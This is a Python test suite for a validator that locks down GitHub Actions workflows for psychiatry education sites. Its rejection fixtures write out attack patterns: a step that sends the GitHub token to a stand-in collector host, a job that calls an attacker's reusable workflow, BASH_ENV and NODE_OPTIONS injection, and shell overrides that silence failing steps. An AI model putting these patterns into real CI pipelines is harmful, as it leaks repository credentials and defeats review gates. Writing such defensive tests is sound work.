import shutil
import sys
import tempfile
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "13_Faculty_Resources" / "_automation"))

from maintenance import validate_scheduled_workflows as workflow_validator  # noqa: E402
from maintenance.validate_scheduled_workflows import (  # noqa: E402
    EXPECTED_CRONS,
    EXPECTED_JOB_IDS,
    EXPECTED_STEP_INVENTORIES,
    EXPECTED_WORKFLOW_CONTRACT_DIGESTS,
    PINNED_ACTIONS,
    SCOPED_FILES,
    validate_repository,
)


EXPECTED = {
    "ci.yml": "0 8 * * 0",
    "surveillance-link-monitor.yml": "0 6 * * 1",
    "surveillance-citations.yml": "0 7 * * 1",
    "surveillance-guideline.yml": "0 6 1 * *",
    "maintenance-sp-health-monitor.yml": "15 */12 * * *",
    "maintenance-production-canary.yml": "20 9 * * *",
    "maintenance-heartbeat.yml": "45 10 * * *",
    "maintenance-governance-digest.yml": "30 12 * * 1",
    "maintenance-monthly-review.yml": "0 13 1 * *",
    "maintenance-rotation-readiness.yml": "15 13 * * *",
}


def load_workflow(name):
    errors = []
    workflow, _source = workflow_validator._load(ROOT, name, errors)
    if errors:
        raise AssertionError(errors)
    return workflow


def load_source_document(source):
    with tempfile.TemporaryDirectory() as directory:
        root = Path(directory)
        workflow_dir = root / ".github" / "workflows"
        workflow_dir.mkdir(parents=True)
        (workflow_dir / "ci.yml").write_text(source, encoding="utf-8")
        errors = []
        workflow, _source = workflow_validator._load(root, "ci.yml", errors)
        if errors:
            raise AssertionError(errors)
        return workflow


def steps(name):
    workflow = load_workflow(name)
    return [
        step
        for job in workflow["jobs"].values()
        for step in job.get("steps", [])
    ]


def cron_for(name):
    schedules = load_workflow(name)["on"]["schedule"]
    return [entry["cron"] for entry in schedules]


class ScheduledWorkflowTests(unittest.TestCase):
    def validate_mutation(self, name, old, new):
        with tempfile.TemporaryDirectory() as directory:
            fixture_root = Path(directory)
            workflow_dir = fixture_root / ".github" / "workflows"
            workflow_dir.mkdir(parents=True)
            for workflow_name in SCOPED_FILES:
                shutil.copy2(
                    ROOT / ".github" / "workflows" / workflow_name,
                    workflow_dir / workflow_name,
                )
            path = workflow_dir / name
            source = path.read_text(encoding="utf-8")
            self.assertEqual(source.count(old), 1, f"mutation anchor in {name}")
            path.write_text(source.replace(old, new, 1), encoding="utf-8")
            return validate_repository(fixture_root)

    def assert_mutation_rejected(self, name, old, new, message):
        errors = self.validate_mutation(name, old, new)
        self.assertTrue(
            any(message in error for error in errors),
            f"expected {message!r} in {errors!r}",
        )

    def test_repository_workflow_contract_is_valid(self):
        self.assertEqual(validate_repository(ROOT), [])

    def test_exact_structural_contract_covers_every_scoped_workflow(self):
        self.assertEqual(set(EXPECTED_JOB_IDS), SCOPED_FILES)
        self.assertEqual(set(EXPECTED_STEP_INVENTORIES), SCOPED_FILES)
        self.assertEqual(set(EXPECTED_WORKFLOW_CONTRACT_DIGESTS), SCOPED_FILES)
        for name in SCOPED_FILES:
            with self.subTest(name=name):
                self.assertEqual(
                    set(EXPECTED_STEP_INVENTORIES[name]),
                    EXPECTED_JOB_IDS[name],
                )
                self.assertRegex(
                    EXPECTED_WORKFLOW_CONTRACT_DIGESTS[name],
                    r"\A[0-9a-f]{64}\Z",
                )

    def test_exact_schedule_map_is_parsed_with_actions_loader(self):
        self.assertEqual(EXPECTED_CRONS, EXPECTED)
        self.assertEqual(
            {name: cron_for(name)[0] for name in EXPECTED},
            EXPECTED,
        )
        for name in EXPECTED:
            self.assertEqual(len(cron_for(name)), 1)

    def test_loader_preserves_github_boolean_and_on_types(self):
        workflow = load_source_document(
            (
                "name: Scalar fixture\n"
                "on:\n"
                "  workflow_dispatch:\n"
                "values:\n"
                "  yes_value: yes\n"
                "  no_value: no\n"
                "  on_value: on\n"
                "  off_value: off\n"
                "  true_value: true\n"
                "  false_value: false\n"
                "  quoted_false: \"false\"\n"
                "  explicit_string_false: !!str false\n"
                "  explicit_true_lower: !!bool true\n"
                "  explicit_true_title: !!bool True\n"
                "  explicit_true_upper: !!bool TRUE\n"
                "  explicit_false_lower: !!bool false\n"
                "  explicit_false_title: !!bool False\n"
                "  explicit_false_upper: !!bool FALSE\n"
            )
        )

        self.assertIn("on", workflow)
        self.assertEqual(
            {
                key: workflow["values"][key]
                for key in ("yes_value", "no_value", "on_value", "off_value")
            },
            {
                "yes_value": "yes",
                "no_value": "no",
                "on_value": "on",
                "off_value": "off",
            },
        )
        self.assertIs(workflow["values"]["true_value"], True)
        self.assertIs(workflow["values"]["false_value"], False)
        self.assertEqual(workflow["values"]["quoted_false"], "false")
        self.assertEqual(
            workflow["values"]["explicit_string_false"],
            "false",
        )
        for key in (
            "explicit_true_lower",
            "explicit_true_title",
            "explicit_true_upper",
        ):
            self.assertIs(workflow["values"][key], True)
        for key in (
            "explicit_false_lower",
            "explicit_false_title",
            "explicit_false_upper",
        ):
            self.assertIs(workflow["values"][key], False)

    def test_validator_rejects_runner_context_before_runner_assignment(self):
        errors = self.validate_mutation(
            "maintenance-heartbeat.yml",
            "  heartbeat:\n    runs-on: ubuntu-latest\n",
            (
                "  heartbeat:\n"
                "    env:\n"
                "      RUN_DIR: ${{ runner.temp }}/heartbeat\n"
                "    runs-on: ubuntu-latest\n"
            ),
        )
        self.assertIn(
            (
                "maintenance-heartbeat.yml: runner context is unavailable "
                "in job-level env"
            ),
            errors,
        )

    def test_validator_rejects_duplicate_keys_at_every_workflow_depth(self):
        cases = (
            (
                "maintenance-sp-health-monitor.yml",
                (
                    "name: Maintenance — Interview Room Health Monitor\n\n"
                    "on:\n"
                ),
                (
                    "name: Maintenance — Interview Room Health Monitor\n\n"
                    "on:\n"
                    "  pull_request_target:\n\n"
                    "on:\n"
                ),
            ),
            (
                "maintenance-sp-health-monitor.yml",
                "jobs:\n  monitor:\n",
                (
                    "jobs:\n"
                    "  monitor:\n"
                    "    runs-on: ubuntu-latest\n"
                    "    steps:\n"
                    "      - run: echo duplicate job\n"
                    "  monitor:\n"
                ),
            ),
            (
                "maintenance-sp-health-monitor.yml",
                (
                    "      - uses: actions/checkout@"
                    "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
                    "        with:\n"
                    "          lfs: false\n"
                ),
                (
                    "      - uses: actions/checkout@"
                    "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
                    "        with:\n"
                    "          lfs: true\n"
                    "        with:\n"
                    "          lfs: false\n"
                ),
            ),
            (
                "maintenance-production-canary.yml",
                (
                    "        env:\n"
                    "          MS3_BASE_URL: "
                    "https://une-ms3-psychiatry.netlify.app\n"
                    "          RES_BASE_URL: "
                    "https://mmc-psychiatry-residents-sanford.netlify.app\n"
                ),
                (
                    "        env:\n"
                    "          BASH_ENV: /tmp/neutralize\n"
                    "        env:\n"
                    "          MS3_BASE_URL: "
                    "https://une-ms3-psychiatry.netlify.app\n"
                    "          RES_BASE_URL: "
                    "https://mmc-psychiatry-residents-sanford.netlify.app\n"
                ),
            ),
        )
        for name, old, new in cases:
            with self.subTest(name=name, duplicate=new):
                self.assert_mutation_rejected(
                    name,
                    old,
                    new,
                    "duplicate mapping key",
                )

    def test_validator_accepts_nonduplicating_yaml_anchors_and_aliases(self):
        errors = self.validate_mutation(
            "maintenance-heartbeat.yml",
            (
                "permissions:\n"
                "  actions: read\n"
                "  contents: read\n"
            ),
            (
                "permissions:\n"
                "  actions: &read_permission read\n"
                "  contents: *read_permission\n"
            ),
        )
        self.assertEqual(errors, [])

    def test_all_action_references_are_immutable_approved_pins(self):
        expected_pins = {
            "actions/checkout": "3d3c42e5aac5ba805825da76410c181273ba90b1",
            "actions/setup-python": "5fda3b95a4ea91299a34e894583c3862153e4b97",
            "actions/setup-node": "820762786026740c76f36085b0efc47a31fe5020",
            "actions/upload-artifact": "043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
            "actions/download-artifact": "3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c",
            "actions/cache": "55cc8345863c7cc4c66a329aec7e433d2d1c52a9",
            "lycheeverse/lychee-action": "e7477775783ea5526144ba13e8db5eec57747ce8",
        }
        self.assertEqual(PINNED_ACTIONS, expected_pins)
        names = [
            *EXPECTED,
            "surveillance-resource-intake.yml",
        ]
        for name in names:
            for step in steps(name):
                uses = step.get("uses")
                if not uses or uses.startswith("./"):
                    continue
                action, separator, revision = uses.partition("@")
                self.assertEqual(separator, "@", name)
                self.assertEqual(revision, expected_pins[action], name)

    def test_every_remote_action_occurrence_requires_its_own_pin_comment(self):
        cases = (
            (
                (
                    "    needs: build-test-validate\n"
                    "    steps:\n"
                    "      - uses: actions/checkout@"
                    "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
                ),
                (
                    "    needs: build-test-validate\n"
                    "    steps:\n"
                    "      - uses: actions/checkout@"
                    "3d3c42e5aac5ba805825da76410c181273ba90b1\n"
                ),
            ),
            (
                (
                    "          lfs: false\n"
                    "          fetch-depth: 0\n\n"
                    "      - uses: actions/setup-node@"
                    "820762786026740c76f36085b0efc47a31fe5020 # v7\n"
                    "        with:\n"
                    "          node-version: \"20\"\n\n"
                ),
                (
                    "          lfs: false\n"
                    "          fetch-depth: 0\n\n"
                    "      - uses: actions/setup-node@"
                    "820762786026740c76f36085b0efc47a31fe5020\n"
                    "        with:\n"
                    "          node-version: \"20\"\n\n"
                ),
            ),
            (
                (
                    "    needs: build-test-validate\n"
                    "    steps:\n"
                    "      - uses: actions/checkout@"
                    "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
                ),
                (
                    "    needs: build-test-validate\n"
                    "    steps:\n"
                    "      - name: Pin comment decoy\n"
                    "        run: |\n"
                    "          uses: actions/checkout@"
                    "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
                    "      - uses: actions/checkout@"
                    "3d3c42e5aac5ba805825da76410c181273ba90b1\n"
                ),
            ),
        )
        for old, new in cases:
            with self.subTest(action=old.split("actions/", 1)[1].split("@", 1)[0]):
                self.assert_mutation_rejected(
                    "ci.yml",
                    old,
                    new,
                    "pin must retain semantic tag on every occurrence",
                )

    def test_remote_action_step_alias_cannot_reuse_one_pin_comment(self):
        self.assert_mutation_rejected(
            "maintenance-sp-health-monitor.yml",
            (
                "      - uses: actions/checkout@"
                "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
                "        with:\n"
                "          lfs: false\n"
            ),
            (
                "      - &checkout_step\n"
                "        uses: actions/checkout@"
                "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
                "        with:\n"
                "          lfs: false\n"
                "      - *checkout_step\n"
            ),
            "pin must retain semantic tag on every occurrence",
        )

    def test_action_with_inputs_preserve_string_coercion_semantics(self):
        cases = (
            (
                "          lfs: false\n",
                "          lfs: \"false\"\n",
            ),
            (
                "          fetch-depth: 0\n",
                "          fetch-depth: \"0\"\n",
            ),
            (
                "          retention-days: 90\n",
                "          retention-days: \"90\"\n",
            ),
        )
        for old, new in cases:
            with self.subTest(new=new.strip()):
                self.assertEqual(
                    self.validate_mutation(
                        "maintenance-heartbeat.yml",
                        old,
                        new,
                    ),
                    [],
                )
        heartbeat_steps = steps("maintenance-heartbeat.yml")
        checkout = next(
            step
            for step in heartbeat_steps
            if step.get("uses", "").startswith("actions/checkout@")
        )
        upload = next(
            step
            for step in heartbeat_steps
            if step.get("uses", "").startswith("actions/upload-artifact@")
        )
        self.assertEqual(
            checkout["with"],
            {"fetch-depth": "0", "lfs": "false"},
        )
        self.assertEqual(upload["with"]["retention-days"], "90")
        self.assertIsInstance(upload["with"]["retention-days"], str)

    def test_artifact_retention_is_bounded_and_maintenance_evidence_is_90_days(self):
        names = [
            *EXPECTED,
            "surveillance-resource-intake.yml",
        ]
        for name in names:
            for step in steps(name):
                if not step.get("uses", "").startswith("actions/upload-artifact@"):
                    continue
                retention = int(step["with"]["retention-days"])
                self.assertLessEqual(retention, 90, name)
                if name != "ci.yml":
                    self.assertEqual(retention, 90, name)
                    self.assertEqual(step.get("if"), "always()", name)
                elif step["with"].get("name") == "built-sites":
                    self.assertEqual(retention, 1, name)
                    self.assertNotIn("if", step)
                else:
                    self.assertEqual(retention, 14, name)
                    self.assertEqual(step.get("if"), "always()", name)

    def test_permissions_are_least_privilege(self):
        expected = {
            "ci.yml": {"contents": "read"},
            "maintenance-sp-health-monitor.yml": {"contents": "read"},
            "maintenance-production-canary.yml": {"contents": "read"},
            "maintenance-heartbeat.yml": {
                "actions": "read",
                "contents": "read",
            },
            "maintenance-governance-digest.yml": {
                "contents": "read",
                "issues": "write",
            },
            "maintenance-monthly-review.yml": {
                "contents": "read",
                "issues": "write",
            },
            "maintenance-rotation-readiness.yml": {
                "contents": "read",
                "issues": "write",
            },
        }
        for name, permissions in expected.items():
            self.assertEqual(load_workflow(name)["permissions"], permissions, name)

    def test_issue_workflows_and_ci_have_exact_safe_concurrency(self):
        expected = {
            "maintenance-governance-digest.yml": {
                "group": "maintenance-governance",
                "cancel-in-progress": False,
            },
            "maintenance-monthly-review.yml": {
                "group": "maintenance-monthly",
                "cancel-in-progress": False,
            },
            "maintenance-rotation-readiness.yml": {
                "group": "maintenance-rotation",
                "cancel-in-progress": False,
            },
        }
        for name, concurrency in expected.items():
            actual = load_workflow(name).get("concurrency")
            self.assertEqual(actual, concurrency, name)
            self.assertIs(actual["cancel-in-progress"], False)
        for name in (
            "surveillance-citations.yml",
            "surveillance-guideline.yml",
            "surveillance-link-monitor.yml",
            "surveillance-resource-intake.yml",
        ):
            concurrency = load_workflow(name).get("concurrency")
            self.assertEqual(concurrency["group"], "surveillance-inbox")
            self.assertIs(concurrency["cancel-in-progress"], False)
        self.assertEqual(
            load_workflow("ci.yml").get("concurrency"),
            {
                "group": "ci-${{ github.event_name }}-${{ github.ref }}",
                "cancel-in-progress": "${{ github.event_name != 'schedule' }}",
            },
        )

    def test_ci_concurrency_separates_events_and_preserves_normal_cancellation(self):
        concurrency = load_workflow("ci.yml")["concurrency"]
        template = concurrency["group"]

        def group(event_name, ref):
            return template.replace(
                "${{ github.event_name }}",
                event_name,
            ).replace("${{ github.ref }}", ref)

        main_ref = "refs/heads/main"
        schedule_group = group("schedule", main_ref)
        push_group = group("push", main_ref)
        manual_group = group("workflow_dispatch", main_ref)
        self.assertEqual(push_group, group("push", main_ref))
        self.assertEqual(
            group("pull_request", "refs/pull/7/merge"),
            group("pull_request", "refs/pull/7/merge"),
        )
        self.assertNotEqual(schedule_group, push_group)
        self.assertNotEqual(schedule_group, manual_group)
        self.assertNotEqual(push_group, manual_group)
        self.assertEqual(
            concurrency["cancel-in-progress"],
            "${{ github.event_name != 'schedule' }}",
        )
        self.assertEqual(
            {
                event_name: event_name != "schedule"
                for event_name in (
                    "schedule",
                    "push",
                    "pull_request",
                    "workflow_dispatch",
                )
            },
            {
                "schedule": False,
                "push": True,
                "pull_request": True,
                "workflow_dispatch": True,
            },
        )

    def test_validator_rejects_decoy_gates_and_neutralized_finalizers(self):
        cases = (
            (
                "ci.yml",
                (
                    "        run: python3 "
                    "13_Faculty_Resources/_automation/maintenance/"
                    "validate_scheduled_workflows.py"
                ),
                (
                    "        run: echo \"python3 "
                    "13_Faculty_Resources/_automation/maintenance/"
                    "validate_scheduled_workflows.py\""
                ),
                "required CI gate",
            ),
            (
                "ci.yml",
                "        run: node --test tests/*.test.mjs",
                (
                    "        run: |\n"
                    "          # node --test tests/*.test.mjs\n"
                    "          true"
                ),
                "required CI gate",
            ),
            (
                "ci.yml",
                (
                    "        run: python3 "
                    "13_Faculty_Resources/_automation/maintenance/"
                    "validate_scheduled_workflows.py"
                ),
                (
                    "        run: |\n"
                    "          python3 "
                    "13_Faculty_Resources/_automation/maintenance/"
                    "validate_scheduled_workflows.py\n"
                    "          exit 0"
                ),
                "required CI gate",
            ),
            (
                "maintenance-governance-digest.yml",
                "          esac\n",
                "          esac\n          exit 0\n",
                "finalizer",
            ),
        )
        for name, old, new, message in cases:
            with self.subTest(name=name, mutation=new):
                self.assert_mutation_rejected(name, old, new, message)

    def test_validator_rejects_direct_issue_api_and_registry_mutation(self):
        marker = "      - name: Preserve governance gate result\n"
        direct_rest = (
            "      - name: Close an issue through the REST API\n"
            "        run: >-\n"
            "          curl --request PATCH --data '{\"state\":\"closed\"}'\n"
            "          https://api.github.com/repos/example/repo/issues/1\n\n"
            + marker
        )
        self.assert_mutation_rejected(
            "maintenance-governance-digest.yml",
            marker,
            direct_rest,
            "direct GitHub issue API",
        )

        for registry in (
            "question_bank.json",
            "topic_meta.json",
            "13_Faculty_Resources/reviewed.json",
        ):
            with self.subTest(registry=registry):
                python_write = (
                    "      - name: Write a clinical registry\n"
                    "        run: >-\n"
                    "          python3 -c \"from pathlib import Path;\n"
                    f"          Path('{registry}').write_text('{{}}')\"\n\n"
                    + marker
                )
                self.assert_mutation_rejected(
                    "maintenance-governance-digest.yml",
                    marker,
                    python_write,
                    "clinical or attestation registry",
                )

    def test_validator_walks_jobs_and_required_step_conditions(self):
        cases = (
            (
                "maintenance-governance-digest.yml",
                "  governance:\n    runs-on: ubuntu-latest\n",
                (
                    "  governance:\n"
                    "    uses: attacker/reusable/.github/workflows/pwn.yml@main\n"
                    "    runs-on: ubuntu-latest\n"
                ),
                "job-level uses",
            ),
            (
                "maintenance-governance-digest.yml",
                "  governance:\n    runs-on: ubuntu-latest\n",
                (
                    "  governance:\n"
                    "    permissions:\n"
                    "      contents: write\n"
                    "    runs-on: ubuntu-latest\n"
                ),
                "job-level permissions",
            ),
            (
                "ci.yml",
                (
                    "      - name: Unit — scheduled maintenance\n"
                    "        run: python3 -m unittest"
                ),
                (
                    "      - name: Unit — scheduled maintenance\n"
                    "        if: github.event_name != 'schedule'\n"
                    "        run: python3 -m unittest"
                ),
                "exclude schedule",
            ),
            (
                "maintenance-governance-digest.yml",
                (
                    "      - name: Build faculty governance digest\n"
                    "        id: governance\n"
                ),
                (
                    "      - name: Build faculty governance digest\n"
                    "        id: governance\n"
                    "        if: github.event_name != 'schedule'\n"
                ),
                "exclude schedule",
            ),
        )
        for name, old, new, message in cases:
            with self.subTest(name=name, mutation=message):
                self.assert_mutation_rejected(name, old, new, message)

    def test_validator_rejects_extra_jobs_and_issue_writing_steps(self):
        self.assert_mutation_rejected(
            "maintenance-governance-digest.yml",
            "jobs:\n  governance:\n",
            (
                "jobs:\n"
                "  bypass:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - run: gh issue create --title bypass --body bypass\n"
                "  governance:\n"
            ),
            "job IDs",
        )

        marker = "      - name: Preserve governance gate result\n"
        self.assert_mutation_rejected(
            "maintenance-governance-digest.yml",
            marker,
            (
                "      - name: Create an unowned issue\n"
                "        run: gh issue create --title bypass --body bypass\n\n"
                + marker
            ),
            "step inventory",
        )

    def test_validator_rejects_execution_neutralization_overrides(self):
        cases = (
            (
                "maintenance-sp-health-monitor.yml",
                "permissions:\n  contents: read\n",
                (
                    "defaults:\n"
                    "  run:\n"
                    "    shell: bash {0} || true\n\n"
                    "permissions:\n"
                    "  contents: read\n"
                ),
                "workflow defaults",
            ),
            (
                "maintenance-sp-health-monitor.yml",
                "  monitor:\n    runs-on: ubuntu-latest\n",
                (
                    "  monitor:\n"
                    "    defaults:\n"
                    "      run:\n"
                    "        shell: bash {0} || true\n"
                    "    runs-on: ubuntu-latest\n"
                ),
                "job defaults",
            ),
            (
                "maintenance-sp-health-monitor.yml",
                "  monitor:\n    runs-on: ubuntu-latest\n",
                (
                    "  monitor:\n"
                    "    continue-on-error: true\n"
                    "    runs-on: ubuntu-latest\n"
                ),
                "job continue-on-error",
            ),
            (
                "maintenance-sp-health-monitor.yml",
                (
                    "      - name: Check public content-free Interview Room receipt\n"
                    "        run: >-\n"
                ),
                (
                    "      - name: Check public content-free Interview Room receipt\n"
                    "        shell: bash {0} || true\n"
                    "        run: >-\n"
                ),
                "step shell",
            ),
            (
                "maintenance-sp-health-monitor.yml",
                (
                    "      - name: Check public content-free Interview Room receipt\n"
                    "        run: >-\n"
                ),
                (
                    "      - name: Check public content-free Interview Room receipt\n"
                    "        continue-on-error: true\n"
                    "        run: >-\n"
                ),
                "step continue-on-error",
            ),
        )
        for name, old, new, message in cases:
            with self.subTest(message=message):
                self.assert_mutation_rejected(name, old, new, message)

    def test_validator_locks_privileged_triggers_and_workflow_environment(self):
        cases = (
            (
                "maintenance-sp-health-monitor.yml",
                "  workflow_dispatch:\n",
                "  workflow_dispatch:\n  pull_request_target:\n",
            ),
            (
                "maintenance-sp-health-monitor.yml",
                "permissions:\n  contents: read\n",
                (
                    "env:\n"
                    "  BASH_ENV: /tmp/neutralize\n"
                    "  NODE_OPTIONS: --require=/tmp/neutralize.js\n\n"
                    "permissions:\n"
                    "  contents: read\n"
                ),
            ),
        )
        for name, old, new in cases:
            with self.subTest(mutation=new):
                self.assert_mutation_rejected(
                    name,
                    old,
                    new,
                    "workflow contract",
                )

    def test_sp_monitor_rejects_extra_credential_bearing_step(self):
        marker = "      - name: Upload Interview Room monitor receipt\n"
        self.assert_mutation_rejected(
            "maintenance-sp-health-monitor.yml",
            marker,
            (
                "      - name: Call a credential-bearing endpoint\n"
                "        env:\n"
                "          X_KEY: ${{ github.token }}\n"
                "        run: >-\n"
                "          curl --header \"X-Key: $X_KEY\"\n"
                "          https://example.invalid/collect\n\n"
                + marker
            ),
            "step inventory",
        )

    def test_surveillance_rejects_split_path_extra_job_and_step(self):
        self.assert_mutation_rejected(
            "surveillance-link-monitor.yml",
            "jobs:\n  link-audit:\n",
            (
                "jobs:\n"
                "  bypass:\n"
                "    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - env:\n"
                "          GH_TOKEN: ${{ github.token }}\n"
                "        run: |\n"
                "          root=https://api.github.com/repos/example/repo\n"
                "          path=issues/1\n"
                "          target=\"$root/$path\"\n"
                "          gh api --method PATCH \"$target\" -f state=closed\n"
                "  link-audit:\n"
            ),
            "job IDs",
        )

        marker = "      - name: Publish rolling surveillance inbox\n"
        self.assert_mutation_rejected(
            "surveillance-citations.yml",
            marker,
            (
                "      - name: Mutate an issue through a split path\n"
                "        env:\n"
                "          GH_TOKEN: ${{ github.token }}\n"
                "        run: |\n"
                "          root=https://api.github.com/repos/example/repo\n"
                "          path=issues/1\n"
                "          target=\"$root/$path\"\n"
                "          gh api --method PATCH \"$target\" -f state=closed\n\n"
                + marker
            ),
            "step inventory",
        )

    def test_validator_locks_every_allowed_step_contract(self):
        self.assert_mutation_rejected(
            "maintenance-monthly-review.yml",
            "        run: python3 -m pip install --requirement requirements.txt\n",
            (
                "        env:\n"
                "          GH_TOKEN: ${{ github.token }}\n"
                "        run: |\n"
                "          root=https://api.github.com/repos/example/repo\n"
                "          path=issues/1\n"
                "          target=\"$root/$path\"\n"
                "          gh api --method PATCH \"$target\" -f state=closed\n"
            ),
            "job and step contract",
        )

    def test_checkout_and_artifact_provenance_contracts_are_exact(self):
        for name in (
            "maintenance-heartbeat.yml",
            "maintenance-monthly-review.yml",
        ):
            with self.subTest(name=name, contract="checkout history"):
                self.assert_mutation_rejected(
                    name,
                    "          fetch-depth: 0\n          lfs: false\n",
                    "          lfs: false\n",
                    "job and step contract",
                )

        self.assert_mutation_rejected(
            "maintenance-production-canary.yml",
            (
                "          path: |\n"
                "            tests/smoke/test-results/\n"
                "            ${{ runner.temp }}/release-twin.json\n"
            ),
            "          path: tests/smoke/test-results/\n",
            "job and step contract",
        )
        self.assert_mutation_rejected(
            "maintenance-sp-health-monitor.yml",
            "          path: ${{ runner.temp }}/sp-health-monitor.json\n",
            "          path: ${{ runner.temp }}/unrelated.json\n",
            "job and step contract",
        )

    def test_production_canary_rejects_swapped_site_environment(self):
        self.assert_mutation_rejected(
            "maintenance-production-canary.yml",
            (
                "          MS3_BASE_URL: https://une-ms3-psychiatry.netlify.app\n"
                "          RES_BASE_URL: "
                "https://mmc-psychiatry-residents-sanford.netlify.app\n"
            ),
            (
                "          MS3_BASE_URL: "
                "https://mmc-psychiatry-residents-sanford.netlify.app\n"
                "          RES_BASE_URL: https://une-ms3-psychiatry.netlify.app\n"
            ),
            "job and step contract",
        )

    def test_validator_rejects_unsafe_concurrency(self):
        safe_issue = (
            "concurrency:\n"
            "  group: maintenance-governance\n"
            "  cancel-in-progress: false\n"
        )
        unsafe_issue = (
            "concurrency:\n"
            "  group: maintenance-${{ github.run_id }}\n"
            "  cancel-in-progress: true\n"
        )
        self.assert_mutation_rejected(
            "maintenance-governance-digest.yml",
            safe_issue,
            unsafe_issue,
            "concurrency",
        )

        safe_ci = (
            "concurrency:\n"
            "  group: ci-${{ github.event_name }}-${{ github.ref }}\n"
            "  cancel-in-progress: ${{ github.event_name != 'schedule' }}\n"
        )
        unsafe_ci = (
            "concurrency:\n"
            "  group: ci-${{ github.ref }}\n"
            "  cancel-in-progress: true\n"
        )
        self.assert_mutation_rejected(
            "ci.yml",
            safe_ci,
            unsafe_ci,
            "concurrency",
        )

    def test_static_concurrency_rejects_string_false_spellings(self):
        for name in (
            "maintenance-governance-digest.yml",
            "surveillance-citations.yml",
        ):
            for replacement in (
                '  cancel-in-progress: "false"\n',
                "  cancel-in-progress: !!str false\n",
            ):
                with self.subTest(name=name, replacement=replacement.strip()):
                    self.assert_mutation_rejected(
                        name,
                        "  cancel-in-progress: false\n",
                        replacement,
                        "workflow contract",
                    )

    def test_explicit_legacy_boolean_tags_fail_with_bounded_error(self):
        name = "maintenance-governance-digest.yml"
        expected = [
            f"{name}: cannot parse workflow (ConstructorError)",
        ]
        for legacy in ("yes", "no", "on", "off"):
            with self.subTest(legacy=legacy):
                errors = self.validate_mutation(
                    name,
                    "  cancel-in-progress: false\n",
                    f"  cancel-in-progress: !!bool {legacy}\n",
                )
                self.assertEqual(errors, expected)

    def test_explicit_false_boolean_case_variants_preserve_contract(self):
        name = "maintenance-governance-digest.yml"
        for spelling in ("false", "False", "FALSE"):
            with self.subTest(spelling=spelling):
                self.assertEqual(
                    self.validate_mutation(
                        name,
                        "  cancel-in-progress: false\n",
                        f"  cancel-in-progress: !!bool {spelling}\n",
                    ),
                    [],
                )

    def test_explicit_invalid_null_tags_fail_with_bounded_error(self):
        name = "maintenance-governance-digest.yml"
        expected = [
            f"{name}: cannot parse workflow (ConstructorError)",
        ]
        for invalid in ("false", "nope"):
            with self.subTest(invalid=invalid):
                errors = self.validate_mutation(
                    name,
                    "  workflow_dispatch:\n",
                    f"  workflow_dispatch: !!null {invalid}\n",
                )
                self.assertEqual(errors, expected)

    def test_valid_null_spellings_preserve_trigger_contract(self):
        name = "maintenance-governance-digest.yml"
        for spelling in (
            "null",
            "Null",
            "NULL",
            "~",
            "!!null null",
            '!!null ""',
        ):
            with self.subTest(spelling=spelling):
                self.assertEqual(
                    self.validate_mutation(
                        name,
                        "  workflow_dispatch:\n",
                        f"  workflow_dispatch: {spelling}\n",
                    ),
                    [],
                )

    def test_legacy_sexagesimal_integer_forms_fail_with_bounded_error(self):
        name = "maintenance-governance-digest.yml"
        expected = [
            f"{name}: cannot parse workflow (ConstructorError)",
        ]
        for spelling in ("1:30", "!!int 1:30"):
            with self.subTest(spelling=spelling):
                errors = self.validate_mutation(
                    name,
                    "          retention-days: 90\n",
                    f"          retention-days: {spelling}\n",
                )
                self.assertEqual(errors, expected)

    def test_legacy_sexagesimal_float_forms_fail_with_bounded_error(self):
        name = "maintenance-governance-digest.yml"
        expected = [
            f"{name}: cannot parse workflow (ConstructorError)",
        ]
        for spelling in ("0:3.11", "!!float 0:3.11"):
            with self.subTest(spelling=spelling):
                errors = self.validate_mutation(
                    name,
                    '          python-version: "3.11"\n',
                    f"          python-version: {spelling}\n",
                )
                self.assertEqual(errors, expected)

    def test_supported_numeric_forms_preserve_action_input_contract(self):
        name = "maintenance-governance-digest.yml"
        for spelling in ("!!int 0132", "!!int 0x5A", "!!int 0o132"):
            with self.subTest(kind="integer", spelling=spelling):
                self.assertEqual(
                    self.validate_mutation(
                        name,
                        "          retention-days: 90\n",
                        f"          retention-days: {spelling}\n",
                    ),
                    [],
                )
        with self.subTest(kind="float", spelling="!!float 3.110"):
            self.assertEqual(
                self.validate_mutation(
                    name,
                    '          python-version: "3.11"\n',
                    "          python-version: !!float 3.110\n",
                ),
                [],
            )

    def test_ci_schedule_reaches_both_authoritative_jobs_and_release_gates(self):
        ci = load_workflow("ci.yml")
        self.assertIn("schedule", ci["on"])
        jobs = ci["jobs"]
        self.assertIn("build-test-validate", jobs)
        self.assertIn("smoke-tests", jobs)
        self.assertEqual(jobs["smoke-tests"]["needs"], "build-test-validate")
        self.assertNotIn("if", jobs["build-test-validate"])
        self.assertNotIn("if", jobs["smoke-tests"])

        build_steps = jobs["build-test-validate"]["steps"]
        ms3_index = next(
            index
            for index, step in enumerate(build_steps)
            if "build_and_check.sh ms3" in step.get("run", "")
        )
        res_index = next(
            index
            for index, step in enumerate(build_steps)
            if "build_and_check.sh res" in step.get("run", "")
        )
        self.assertLess(ms3_index, res_index)

        smoke_steps = jobs["smoke-tests"]["steps"]
        downloads = [
            step
            for step in smoke_steps
            if str(step.get("uses", "")).startswith("actions/download-artifact@")
        ]
        self.assertEqual(len(downloads), 1)
        self.assertEqual(
            downloads[0]["with"],
            {"name": "built-sites", "path": "_build"},
        )
        handoff_uploads = [
            index
            for index, step in enumerate(build_steps)
            if str(step.get("uses", "")).startswith("actions/upload-artifact@")
            and step.get("with", {}).get("name") == "built-sites"
        ]
        self.assertEqual(len(handoff_uploads), 1)
        self.assertLess(res_index, handoff_uploads[0])

        smoke_runs = "\n".join(
            step.get("run", "") for step in smoke_steps
        )
        self.assertIn("github.event_name", smoke_runs)
        self.assertIn(
            "https://une-ms3-psychiatry.netlify.app",
            smoke_runs,
        )
        self.assertIn(
